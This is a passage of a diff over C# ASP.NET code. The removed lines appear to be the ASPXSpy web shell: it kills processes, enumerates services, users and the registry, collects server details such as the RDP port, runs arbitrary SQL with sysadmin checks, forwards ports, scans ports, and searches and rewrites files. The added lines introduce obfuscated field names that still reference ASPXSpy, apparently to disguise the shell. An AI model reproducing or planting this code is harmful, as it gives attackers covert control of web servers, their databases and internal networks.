-					td.Text=dt.Rows[j]["ProcessID"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==3)
-				{
-					td.Text=dt.Rows[j]["Name"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==4)
-				{
-					td.Text=dt.Rows[j]["ThreadCount"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==5)
-				{
-					td.Text=dt.Rows[j]["Priority"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==6)
-				{
-					td.Text=zcg_MakeKillProcessLink(dt.Rows[j]["ProcessID"]);
-					tr.Controls.Add(td);
-				}
-			}
-			Bin_Table_Process.Controls.Add(tr);
-		}
-	}
-	private string zcg_MakeKillProcessLink(object pid)
-	{
-		return string.Format("<a href=\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\">Kill</a>",pid);
-	}
-	private void zcg_KillProcess(string pid)
-	{
-		zcg_ProcessHeader();
-		try{zcg_DoKillProcess(pid);Bin_Msg("Process Kill Success !");}catch{try{zcg_DoKillProcessWmi(pid);}catch(Exception ex){zcg_ShowError(ex);}}
-		Bin_Button_Process_Click(null,null);
-	}
-	private void zcg_DoKillProcess(string pid)
-	{
-		Process.GetProcessById(Int32.Parse(pid)).Kill();
-	}
-	private void zcg_DoKillProcessWmi(string pid)
-	{
-		uint i=0;
-		foreach(ManagementObject p in Bin_WmiQuery("root\\CIMV2","Select * from Win32_Process Where ProcessID ='"+pid+"'"))
-		{
-			i=(uint)(p.InvokeMethod("Terminate",null));
-			p.Dispose();
-		}
-		if(i==0){Bin_Msg("Process Kill Success !");}
-		else{Bin_Msg("Kill process error , returned value: "+i);}
-	}
-	private void Bin_GetServices()
-	{
-		int pcount=0;
-		ServiceController[] objsrv=System.ServiceProcess.ServiceController.GetServices();
-		for(int i=0;i<objsrv.Length;i++)
-		{
-			pcount++;
-			TableRow tr=zcg_GetTableRow();
-			for(int b=1;b<7;b++)
-			{
-				TableCell td=new TableCell();
-				if(b==1)
-				{
-					td.Width=Unit.Parse("2%");
-					td.Text=pcount.ToString();
-					tr.Controls.Add(td);
-				}
-				if(b==2)
-				{
-					td.Text="null";
-					tr.Controls.Add(td);
-				}
-				if(b==3)
-				{
-					td.Text=objsrv[i].ServiceName.ToString();
-					tr.Controls.Add(td);
-				}
-				if(b==4)
-				{
-					td.Text="";
-					tr.Controls.Add(td);
-				}
-				if(b==5)
-				{
-					string state=objsrv[i].Status.ToString();
-					if(state=="Running")
-					{
-						td.Text="<font color=green>"+state+"</font>";
-					}
-					else
-					{
-						td.Text="<font color=red>"+state+"</font>";
-					}
-					tr.Controls.Add(td);
-				}
-				if(b==6)
-				{
-					td.Text="";
-					tr.Controls.Add(td);
-				}
-			}
-			Bin_Table_Serviecs.Controls.Add(tr);
-		}
-	}
-	private void Bin_Wmi_GetServices()
-	{
-		int pcount=0;
-		DataTable dt=zcg_WmiDataTable("root\\CIMV2","select * from Win32_Service");
-		for(int j=0;j<dt.Rows.Count;j++)
-		{
-			pcount++;
-			TableRow tr=zcg_GetTableRow();
-			tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
-			for(int i=1;i<7;i++)
-			{
-				TableCell td=new TableCell();
-				if(i==1)
-				{
-					td.Width=Unit.Parse("2%");
-					td.Text=pcount.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==2)
-				{
-					td.Text=dt.Rows[j]["ProcessID"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==3)
-				{
-					td.Text=dt.Rows[j]["Name"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==4)
-				{
-					td.Text=dt.Rows[j]["PathName"].ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==5)
-				{
-					string state=dt.Rows[j]["State"].ToString();
-					if(state=="Running")
-					{
-						td.Text="<font color=green>"+state+"</font>";
-					}
-					else
-					{
-						td.Text="<font color=red>"+state+"</font>";
-					}
-					tr.Controls.Add(td);
-				}
-				if(i==6)
-				{
-					td.Text=dt.Rows[j]["StartMode"].ToString();
-					tr.Controls.Add(td);
-				}
-			}
-			Bin_Table_Serviecs.Controls.Add(tr);
-		}
-	}
-	private void Bin_UserInfo()
-	{
-		DirectoryEntry users=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
-		foreach(DirectoryEntry child in users.Children)
-		{
-			foreach(string name in child.Properties.PropertyNames)
-			{
-				PropertyValueCollection pvc=child.Properties[name];
-				int c=pvc.Count;
-				for(int i=0;i<c;i++)
-				{
-					if(name!="objectSid"&&name!="Parameters"&&name!="LoginHours")
-					{
-						TableRow tr=zcg_GetTableRow();
-						TableCell td=new TableCell();
-						td.Text=name;
-						tr.Controls.Add(td);
-						TableCell td1=new TableCell();
-						td1.Text=pvc[i].ToString();
-						tr.Controls.Add(td1);
-						Bin_Table_User.Controls.Add(tr);
-					}
-				}
-			}
-			TableRow trn=new TableRow();
-			for(int x=1;x<3;x++)
-			{
-				TableCell tdn=new TableCell();
-				tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
-				trn.Controls.Add(tdn);
-				Bin_Table_User.Controls.Add(trn);
-			}
-		}
-	}
-	private void Bin_Wmi_UserInfo()
-	{
-		DataTable user=zcg_WmiDataTable("root\\CIMV2","select * from Win32_UserAccount");
-		for(int i=0;i<user.Rows.Count;i++)
-		{
-			for(int j=0;j<user.Columns.Count;j++)
-			{
-				TableRow tr=zcg_GetTableRow();
-				TableCell td=new TableCell();
-				td.Text=user.Columns[j].ToString();
-				tr.Controls.Add(td);
-				TableCell td1=new TableCell();
-				td1.Text=user.Rows[i][j].ToString();
-				tr.Controls.Add(td1);
-				Bin_Table_User.Controls.Add(tr);
-			}
-			TableRow trn=new TableRow();
-			for(int x=1;x<3;x++)
-			{
-				TableCell tdn=new TableCell();
-				tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
-				trn.Controls.Add(tdn);
-				Bin_Table_User.Controls.Add(trn);
-			}
-		}
-	}
-	private void Bin_Sysinfo()
-	{
-		Hide_Div();
-		Bin_Div_Sysinfo.Visible=true;
-		Bin_H2_Title.InnerText="System Information >>";
-		Bin_H2_Mac.InnerText="MAC Information >>";
-		Bin_H2_Driver.InnerText="Driver Information >>";
-		StringBuilder s_inf=new StringBuilder();
-		StringBuilder s_netconfig=new StringBuilder();
-		StringBuilder s_driver=new StringBuilder();
-		try
-		{
-			s_inf.Append("<li><u>Server Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
-			s_inf.Append("<li><u>Server Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
-			s_inf.Append("<li><u>Server OS : </u>"+Environment.OSVersion+"</li>");
-			s_inf.Append("<li><u>Server Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
-			s_inf.Append("<li><u>Server UserName : </u>"+zcg_GetUserName()+"</li>");
-			s_inf.Append("<li><u>Server Time : </u>"+System.DateTime.Now.ToString()+"</li>");
-			RegistryKey key_ts=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
-			string tsport=GetRegValue(key_ts,"PortNumber");
-			RegistryKey key_cpu=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
-			int cpu=key_cpu.SubKeyCount;
-			RegistryKey key_cpuinfo=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
-			string cpuver=GetRegValue(key_cpuinfo,"ProcessorNameString");
-			s_inf.Append("<li><u>Terminal Port : </u>"+tsport+"</li>");
-			s_inf.Append("<li><u>CPU Count : </u>"+cpu.ToString()+"</li>");
-			s_inf.Append("<li><u>CPU Version : </u>"+cpuver+"</li>");
-			s_inf.Append("<li><u>Server TimeZone : </u>"+zcg_WmiDataTable("root\\CIMV2","select * from Win32_TimeZone").Rows[0]["Caption"]+"</li>");
-			DataTable BIOS=zcg_WmiDataTable("root\\CIMV2","select * from Win32_BIOS");
-			s_inf.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
-			DataTable Memory=zcg_WmiDataTable("root\\CIMV2","select * from Win32_PhysicalMemory");
-			Int64 Memoryall=0;
-			for(int i=0;i<Memory.Rows.Count;i++)
-			{
-				Memoryall+=Int64.Parse(Memory.Rows[0]["Capacity"].ToString());
-			}
-			s_inf.Append("<li><u>Server Memory : </u>"+Bin_FileSize(Memoryall)+"</li>");
-			DataTable NetConfig=zcg_WmiDataTable("root\\CIMV2","select * from Win32_NetworkAdapterConfiguration");
-			for(int i=0;i<NetConfig.Rows.Count;i++)
-			{
-				s_netconfig.Append("<li><u>Server MAC"+i+" : </u>"+NetConfig.Rows[i]["Caption"]+"</li>");
-				if((NetConfig.Rows[i]["MACAddress"] as string)!="")
-				{
-					s_netconfig.Append("<li style=\"list-style:none;\"><u>Address : </u>"+NetConfig.Rows[i]["MACAddress"]+"</li>");
-				}
-			}
-			DataTable Driver=zcg_WmiDataTable("root\\CIMV2","select * from Win32_SystemDriver");
-			for (int i=0; i<Driver.Rows.Count; i++)
-			{
-				s_driver.Append("<li><u class='u1'>Server Driver"+i+" : </u><u class='u2'>"+Driver.Rows[i]["Caption"]+"</u> ");
-				if ((Driver.Rows[i]["PathName"] as string)!="")
-				{
-					s_driver.Append("Path : "+Driver.Rows[i]["PathName"]);
-				}
-				else
-				{
-					s_driver.Append("No path information");
-				}
-				s_driver.Append("</li>");
-			}
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		finally
-		{
-			Bin_Ul_Sys.InnerHtml=s_inf.ToString();
-			Bin_Ul_NetConfig.InnerHtml=s_netconfig.ToString();
-			Bin_Ul_Driver.InnerHtml=s_driver.ToString();
-		}
-	}
-	private void Bin_Reg()
-	{
-		zcg_RegHeader();
-		RegInit();
-	}
-	private void zcg_RegHeader()
-	{
-		Hide_Div();
-		Bin_Div_Reg.Visible=true;
-		Bin_H2_Title.InnerText="RegShell >>";
-		string RootKeys=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
-		Bin_Regroot_Href.Text="";
-		foreach(string rootkey in RootKeys.Split('|'))
-		{
-			Bin_Regroot_Href.Text+="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+Bin_ToBase64(rootkey)+"')\">"+rootkey+"</a> | ";
-		}
-	}
-	private void RegInit()
-	{
-		Bin_Text_Regread.Text="";
-		string RootKeys=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
-		TableRow tr;
-		TableCell tc;
-		foreach(string rootkey in RootKeys.Split('|'))
-		{
-			tc=new TableCell();
-			tr=zcg_GetTableRow();
-			tc.Width=Unit.Parse("40%");
-			tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+Bin_ToBase64(rootkey)+"')\">"+rootkey+"</a>";
-			tr.Cells.Add(tc);
-			tc=new TableCell();
-			tc.Width=Unit.Parse("60%");
-			tc.Text="&lt;RootKey&gt;";
-			tr.Cells.Add(tc);
-			Bin_Table_Reg.Rows.Add(tr);
-		}
-	}
-	private void Bin_ShowReg(string Reg_Path)
-	{
-		zcg_RegHeader();
-		if(!Reg_Path.EndsWith("\\"))
-		{
-			Reg_Path=Reg_Path+"\\";
-		}
-		Bin_Text_Regread.Text=Reg_Path;
-		string ParPath=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
-		ParPath=Regex.Replace(ParPath,@"\\+","\\");
-		TableRow tr=zcg_GetTableRow();
-		TableCell tc=new TableCell();
-		tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+Bin_ToBase64(ParPath)+"')\">Parent Key</a>";
-		tc.Attributes["colspan"]="2" ;
-		tr.Cells.Add(tc);
-		Bin_Table_Reg.Rows.Add(tr);
-		try
-		{
-			string strSubkey=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
-			RegistryKey rk=null;
-			RegistryKey sk;
-			if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE",true,null)||Reg_Path.StartsWith("hklm",true,null))
-			{
-				rk=Registry.LocalMachine;
-			}
-			else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT",true,null)||Reg_Path.StartsWith("hkcr",true,null))
-			{
-				rk=Registry.ClassesRoot;
-			}
-			else if(Reg_Path.StartsWith("HKEY_CURRENT_USER",true,null)||Reg_Path.StartsWith("hkcu",true,null))
-			{
-				rk=Registry.CurrentUser;
-			}
-			else if(Reg_Path.StartsWith("HKEY_USERS",true,null)||Reg_Path.StartsWith("hku",true,null))
-			{
-				rk=Registry.Users;
-			}
-			else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG",true,null)||Reg_Path.StartsWith("hkcc",true,null))
-			{
-				rk=Registry.CurrentConfig;
-			}
-			if(strSubkey.Length>1)
-			{
-				sk=rk.OpenSubKey(strSubkey);
-			}
-			else
-			{
-				sk=rk;
-			}
-			foreach(string innerSubKey in sk.GetSubKeyNames())
-			{
-				tr=zcg_GetTableRow();
-				tc=new TableCell();
-				tc.Width=Unit.Parse("40%");
-				tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+Bin_ToBase64(Reg_Path+innerSubKey)+"')\">"+innerSubKey+"</a>";
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Width=Unit.Parse("60%");
-				tc.Text="&lt;SubKey&gt;";
-				tr.Cells.Add(tc);
-				Bin_Table_Reg.Rows.Add(tr);
-			}
-			TableRow intr=new TableRow();
-			intr.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
-			intr.Attributes["bgcolor"]="#dddddd";
-			TableCell intc=new TableCell();
-			intc.Attributes["colspan"]="2" ;
-			intc.Attributes["height"]="5";
-			intr.Cells.Add(intc);
-			Bin_Table_Reg.Rows.Add(intr);
-			foreach(string strValueName in sk.GetValueNames())
-			{
-				tr=zcg_GetTableRow();
-				tc=new TableCell();
-				tc.Width=Unit.Parse("40%");
-				tc.Text=strValueName;
-				tr.Cells.Add(tc);
-				tc=new TableCell();
-				tc.Width=Unit.Parse("60%");
-				tc.Text=GetRegValue(sk,strValueName);
-				tr.Cells.Add(tc);
-				Bin_Table_Reg.Rows.Add(tr);
-			}
-		}
-		catch(NullReferenceException ex){Bin_Msg("Path not found");}
-		catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private string GetRegValue(RegistryKey sk,string strValueName)
-	{
-		object buffer;
-		string regstr="";
-		try
-		{
-			buffer=sk.GetValue(strValueName,"NULL");
-			if(buffer.GetType()==typeof(byte[]))
-			{
-				foreach(byte tmpbyte in(byte[])buffer)
-				{
-					if((int)tmpbyte<16)
-					{
-						regstr+="0";
-					}
-					regstr+=tmpbyte.ToString("X");
-				}
-			}
-			else if(buffer.GetType()==typeof(string[]))
-			{
-				foreach(string tmpstr in(string[])buffer)
-				{
-					regstr+=tmpstr;
-				}
-			}
-			else
-			{
-				regstr=buffer.ToString();
-			}
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		return regstr;
-	}
-	private void Bin_PortScan()
-	{
-		Hide_Div();
-		Bin_Div_PortScan.Visible=true;
-		Bin_H2_Title.InnerText="PortScan >>";
-	}
-	private void Bin_DataBase()
-	{
-		Hide_Div();
-		Bin_Div_Data.Visible=true;
-		Bin_Div_DBPanel.Visible=false;
-		Bin_H2_Title.InnerText="DataBase >>";
-	}
-	private void OpenConnection()
-	{
-		if(IsSqlServer())
-		{
-			conn=new SqlConnection();
-			comm=new SqlCommand();
-		}else{
-		conn=new OleDbConnection();
-		comm=new OleDbCommand();
-		}
-		if(conn.State==ConnectionState.Closed)
-		{
-			try
-			{
-				conn.ConnectionString=Bin_TextBox_ConnStr.Text;
-				comm.Connection=conn;
-				conn.Open();
-				if(IsSqlServer()&&Bin_List_DB.SelectedItem!=null&&Bin_List_DB.SelectedItem.Value!="")
-				{
-					conn.ChangeDatabase(Bin_List_DB.SelectedItem.Value.ToString());
-				}
-			}
-			catch(Exception error)
-			{
-				zcg_ShowError(error);
-			}
-		}
-	}
-	private void CloseConnection()
-	{
-		if(conn.State==ConnectionState.Open)
-		{
-			conn.Close();
-		}
-		conn.Dispose();
-		comm.Dispose();
-	}
-	private bool IsSqlServer()
-	{
-		return Bin_List_Connstr.SelectedItem.Text=="MSSQL";
-	}
-	private DataTable Bin_DataTable(string sqlstr)
-	{
-		DbDataAdapter da=null;
-		if(IsSqlServer())
-		{
-			da=new SqlDataAdapter();
-		}else{
-			da=new OleDbDataAdapter();
-		}
-		DataTable dtable=new DataTable();
-		try
-		{
-			OpenConnection();
-			comm.CommandType=CommandType.Text;
-			comm.CommandText=sqlstr;
-			da.SelectCommand=comm;
-			da.Fill(dtable);
-		}
-		finally
-		{
-			CloseConnection();
-		}
-		return dtable;
-	}
-	private bool Bin_ExecSql(string instr)
-	{
-		try
-		{
-			OpenConnection();
-			comm.CommandType=CommandType.Text;
-			comm.CommandText=instr;
-			comm.ExecuteNonQuery();
-			return true;
-		}
-		catch(Exception e)
-		{
-			zcg_ShowError(e);
-			return false;
-		}
-	}
-	private void Bin_ExecBind()
-	{
-		try
-		{
-			DataTable dt=Bin_DataTable(Bin_Textarea_Query.InnerText);
-			if(dt.Columns.Count>0)
-			{
-				Bin_DataGrid.PreRender+=new EventHandler(DataGrid_PreRender);
-				Bin_DataGrid.DataSource=dt;
-				Bin_DataGrid.DataBind();
-				for(int i=0;i<Bin_DataGrid.Items.Count;i++)
-				{
-					zcg_SetControlAttribute(Bin_DataGrid.Items[i]);
-				}
-			}
-			else
-			{
-				Bin_DataGrid.DataSource=null;
-				Bin_DataGrid.DataBind();
-			}
-			Bin_DataGrid.Visible=true;
-		}
-		catch(Exception e)
-		{
-			zcg_ShowError(e);
-			Bin_DataGrid.Visible=false;
-		}
-	}
-	private void Bin_DataBind()
-	{
-		try
-		{
-			if(IsSqlServer()&&Bin_List_DB.SelectedItem.Value=="")
-			{
-				Bin_DataGrid.DataSource=null;
-				Bin_DataGrid.DataBind();
-				return;
-			}
-			OpenConnection();
-			DataTable tables=new DataTable();
-			if(IsSqlServer()&&Bin_List_DB.SelectedItem.Value!="")
-			{
-				conn.ChangeDatabase(Bin_List_DB.SelectedItem.Text);
-			}
-			tables=conn.GetSchema("Tables");
-			tables.Columns.Remove("TABLE_CATALOG");
-			tables.Columns.Remove("TABLE_SCHEMA");
-			if(!IsSqlServer()){tables.Columns.Remove("DESCRIPTION");tables.Columns.Remove("TABLE_PROPID");}
-			Bin_DataGrid.PreRender+=new EventHandler(DataGrid_PreRender);
-			Bin_DataGrid.DataSource=tables;
-			Bin_DataGrid.DataBind();
-			for(int i=0;i<Bin_DataGrid.Items.Count;i++)
-			{
-				string tname=Bin_DataGrid.Items[i].Cells[0].Text;
-				zcg_SetControlAttribute(Bin_DataGrid.Items[i]);
-				Bin_DataGrid.Items[i].Attributes["onclick"]="ASPXSpy.Bin_Textarea_Query.value='select * from " + tname + "';";
-			}
-			Bin_DataGrid.Visible=true;
-		}
-		catch(Exception e)
-		{
-			zcg_ShowError(e);
-			Bin_DataGrid.Visible=false;
-		}
-	}
-	protected void DataGrid_PreRender(object sender,EventArgs e)
-	{
-		DataGrid d=(DataGrid)sender;
-		foreach(DataGridItem item in d.Items)
-		{
-			foreach(TableCell t in item.Cells)
-			{
-				t.Text=t.Text.Replace("<","&lt;").Replace(">","&gt;");
-			}
-		}
-	}
-	private void Bin_Newconn()
-	{
-		Bin_Div_DBPanel.Visible=true;
-		try
-		{
-			Bin_Textarea_Query.InnerHtml="";
-			if(Bin_List_Connstr.SelectedItem.Text=="MSSQL")
-			{
-				Bin_DataGrid.Visible=false;
-				Bin_Div_Dblist.Visible=true;
-				Bin_Div_Dbinfo.Visible=true;
-				OpenConnection();
-				string cdb=conn.Database;
-				string verstr=Bin_DataTable(@"SELECT @@VERSION").Rows[0][0].ToString();
-				DataTable dbs=Bin_DataTable(@"SELECT name FROM master..sysdatabases");
-				DataTable rol=Bin_DataTable(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
-				DataTable owner=Bin_DataTable(@"SELECT IS_MEMBER('db_owner')");
-				string dbo="";
-				if(owner.Rows[0][0].ToString()=="1")
-				{
-					dbo="db_owner";
-				}
-				else
-				{
-					dbo="public";
-				}
-				if(rol.Rows[0][0].ToString()=="1")
-				{
-					dbo="<font color=blue>sa</font>";
-				}
-				Bin_List_Exec.SelectedIndex=0;
-				Bin_List_DB.Items.Clear();
-				for(int i=0;i<dbs.Rows.Count;i++)
-				{
-					Bin_List_DB.Items.Add(dbs.Rows[i][0].ToString());
-					if (cdb==dbs.Rows[i][0].ToString())
-					{
-						Bin_List_DB.Items[i].Selected=true;
-					}
-				}
-				Bin_Div_Dbinfo.InnerHtml="<p><font color=red>MSSQL Version</font> : <i><b>"+verstr+"</b></i></p><p><font color=red>SrvRoleMember</font> : <i><b>"+dbo+"</b></i></p>";
-			}
-			else
-			{
-				Bin_Div_Dblist.Visible=false;
-				Bin_Div_Dbinfo.Visible=false;
-			}
-			Bin_DataBind();
-		}
-		catch(Exception e)
-		{
-			zcg_ShowError(e);
-			Bin_Div_DBPanel.Visible=false;
-		}
-	}
-	private void Bin_PortMap()
-	{
-		Hide_Div();
-		Bin_Div_PortMap.Visible=true;
-		Bin_H2_Title.InnerText="PortMap >>";
-	}
-    private void Bin_WmiTools()
-    {
-        Hide_Div();
-        Bin_Div_WmiTools.Visible = true;
-        Bin_Div_WmiPanel.Visible = false;
-        Bin_H2_Title.InnerText = "WmiTools >>";
-    }
+public string vbhLn="ASPXSpy";
 
-	internal class PortForward
-	{
-		public string LocalAddress;
-		public int LocalPort;
-		public string RemoteAddress;
-		public int RemotePort;
-		private Socket ltcpClient;
-		private Socket rtcpClient;
-		private byte[] rbuffer=new byte[2048];
-		private byte[] lbuffer=new byte[2048];
-		internal struct session
-		{
-			public Socket rdel;
-			public Socket ldel;
-		}
-		public bool IsConnected{get{return ltcpClient.Connected&&rtcpClient.Connected;}}
-		private IPEndPoint GetIPEndPoint(string host,int port)
-		{
-			try{
-			IPEndPoint iep=null;
-			IPAddress ipAddress=Dns.Resolve(host).AddressList[0];
-			iep=new IPEndPoint(ipAddress,port);
-			return iep;}catch{throw new Exception("Host not found.");}
-		}
-		public void Start(string Rip,int Rport,string lip,int lport)
-		{
-			LocalPort=lport;
-			RemoteAddress=Rip;
-			RemotePort=Rport;
-			LocalAddress=lip;
-			new SocketPermission(NetworkAccess.Connect,TransportType.Tcp,Rip,Rport).Demand();
-			new SocketPermission(NetworkAccess.Connect,TransportType.Tcp,lip,lport).Demand();
-			rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
-			ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
-			rtcpClient.BeginConnect(Rip,Rport,new AsyncCallback(OnRConnect),rtcpClient);
-		}
-		protected void OnRConnect(IAsyncResult ar)
-		{
-			try
-			{
-				session mysession=new session();
-				mysession.ldel=ltcpClient;
-				mysession.rdel=rtcpClient;
-				ltcpClient.BeginConnect(LocalAddress,LocalPort,new AsyncCallback(OnLConnect),mysession);
-			}catch{ }
-		}
-		protected void OnLConnect(IAsyncResult ar)
-		{
-			try
-			{
-				session mysession=(session)ar.AsyncState;
-				ltcpClient.EndConnect(ar);
-				mysession.rdel.BeginReceive(rbuffer,0,rbuffer.Length,SocketFlags.None,new AsyncCallback(OnRReceive),mysession);
-				mysession.ldel.BeginReceive(lbuffer,0,lbuffer.Length,SocketFlags.None,new AsyncCallback(OnLReceive),mysession);
-			}catch{ }
-		}
-		protected void OnRReceive(IAsyncResult ar)
-		{
-			try
-			{
-				session mysession=(session)ar.AsyncState;
-				int Ret=mysession.rdel.EndReceive(ar);
-				if (Ret>0)
-					ltcpClient.BeginSend(rbuffer,0,Ret,SocketFlags.None,new AsyncCallback(onlsend),mysession);
-				else Stop();
-			}catch{ }
-		}
-		protected void onlsend(IAsyncResult ar)
-		{
-			try
-			{
-				session mysession=(session)ar.AsyncState;
-				mysession.ldel.EndSend(ar);
-				mysession.rdel.BeginReceive(rbuffer,0,rbuffer.Length,SocketFlags.None,new AsyncCallback(this.OnRReceive),mysession);
-			}catch{ }
-		}
-		protected void OnLReceive(IAsyncResult ar)
-		{
-			try
-			{
-				session mysession=(session)ar.AsyncState;
-				int Ret=mysession.ldel.EndReceive(ar);
+public int TdgGU=3-2;
 
-				if (Ret>0)
-					mysession.rdel.BeginSend(lbuffer,0,Ret,SocketFlags.None,new AsyncCallback(onrsend),mysession);
-				else Stop();
-			}catch{ }
-		}
-		protected void onrsend(IAsyncResult ar)
-		{
-			try
-			{
+protected OleDbConnection Dtdr=new OleDbConnection();
 
-				session mysession=(session)ar.AsyncState;
-				mysession.rdel.EndSend(ar);
-				mysession.ldel.BeginReceive(lbuffer,0,lbuffer.Length,SocketFlags.None,new AsyncCallback(this.OnLReceive),mysession);
-			}catch{ }
-		}
-		public void Stop()
-		{
-			try
-			{
-				if (ltcpClient!=null)
-				{
-					ltcpClient.Close();
-				}
-				if (rtcpClient!=null)
-					rtcpClient.Close();
-			}
-			catch{ }
-		}
-	}
-	internal class ScanPort
-	{
-		public string ip="";
-		public int port=0;
-		public string status="Not scanned";
-		public ScanPort(string ip,int port)
-		{
-			this.ip=ip;
-			this.port=port;
-		}
-		public void Scan()
-		{
-			TcpClient tc=new TcpClient();
-			try
-			{
-				tc.Connect(ip,port);
-				tc.Close();
-				status="<font color=green><b>Open</b></font>";
-			}
-			catch
-			{
-				status="<font color=red><b>Close</b></font>";
-			}
-		}
-	}
-	public static void JscriptSender(System.Web.UI.Page page)
-	{
-		page.RegisterHiddenField("__EVENTTARGET","");
-		page.RegisterHiddenField("__FILE","");
-		string s=@"<script language=Javascript>";
-		s+=@"function Bin_PostBack(eventTarget,eventArgument)";
-		s+=@"{";
-		s+=@"var theform=document.forms[0];";
-		s+=@"theform.__EVENTTARGET.value=eventTarget;";
-		s+=@"theform.__FILE.value=eventArgument;";
-		s+=@"theform.submit();theform.__EVENTTARGET.value="""";theform.__FILE.value=""""";
-		s+=@"} ";
-		s+=@"</scr"+"ipt>";
-		page.RegisterStartupScript("",s);
-	}
-	protected void Bin_Search_Start(object sender,EventArgs e)
-	{
-		Hide_Div();
-		Bin_Div_Search.Visible=true;
-		Bin_H2_Title.InnerText="File Search >>";
-		Bin_Search_Path.Value=Request.PhysicalApplicationPath;
-		Bin_Table_Search.Visible=false;
-	}
-	protected void Bin_Button_Search_Click(object sender,EventArgs e)
-	{
-		try{
-		DirectoryInfo Bin_dir=new DirectoryInfo(Bin_Search_Path.Value);
-		if(!Bin_dir.Exists)
-		{
-			Bin_Msg("Path invalid ! ");
-			return;
-		}
-		Bin_DoSearch(Bin_dir);
-		Bin_Msg("Search completed ! ");}catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private void Bin_DoSearch(DirectoryInfo dir)
-	{
-		try
-		{
-			Bin_Table_Search.Visible=true;
-			foreach(FileInfo Bin_Files in dir.GetFiles())
-			{
-				try
-				{
-					if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+Bin_Search_Ext.Value+")$",RegexOptions.IgnoreCase))
-					{
-						continue;
-					}
-					if(Bin_Search_Mod.SelectedItem.Value=="name")
-					{
-						if(Bin_Search_UseReg.Checked)
-						{
-							if(Regex.IsMatch(Bin_Files.Name,Bin_TextArea_Search.Value,RegexOptions.IgnoreCase))
-							{
-								Bin_DoSearchLink(Bin_Files);
-							}
-						}
-						else
-						{
-							if(Bin_Files.Name.ToLower().IndexOf(Bin_TextArea_Search.Value.ToLower())!=-1)
-							{
-								Bin_DoSearchLink(Bin_Files);
-							}
-						}
-					}
-					else
-					{
-						StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);
-						string filecontent=sr.ReadToEnd();
-						sr.Close();
-						if(Bin_Search_UseReg.Checked)
-						{
-							if(Regex.IsMatch(filecontent,Bin_TextArea_Search.Value,RegexOptions.IgnoreCase))
-							{
-								Bin_DoSearchLink(Bin_Files);
-								if(Bin_Search_Replace.Checked)
-								{
-									filecontent=Regex.Replace(filecontent,Bin_TextArea_Search.Value,Bin_TextArea_ReplaceAs.Value,RegexOptions.IgnoreCase);
-									StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
-									sw.Write(filecontent);
-									sw.Close();
-								}
-							}
-						}
-						else
-						{
-							if(filecontent.ToLower().IndexOf(Bin_TextArea_Search.Value.ToLower())!=-1)
-							{
-								Bin_DoSearchLink(Bin_Files);
-								if(Bin_Search_Replace.Checked)
-								{
-									filecontent=filecontent.Replace(Bin_TextArea_Search.Value,Bin_TextArea_ReplaceAs.Value);
-									StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
-									sw.Write(filecontent);
-									sw.Close();
-								}
-							}
-						}
-					}
-				}
-				catch(Exception ex)
-				{
-					zcg_ShowError(ex);
-					continue;
-				}
-			}
-			foreach(DirectoryInfo subdir in dir.GetDirectories())
-			{
-				Bin_DoSearch(subdir);
-			}
-		}
-		catch(Exception ex)
-		{
-			zcg_ShowError(ex);
-		}
-	}
-	private void Bin_DoSearchLink(FileInfo objfile)
-	{
-		TableRow tr=zcg_GetTableRow();
-		TableCell tc=new TableCell();
-		tc.Text="<a href=\"javascript:Bin_PostBack('Bin_DownFile','"+Bin_ToBase64(objfile.FullName)+"')\">"+objfile.FullName+"</a>";
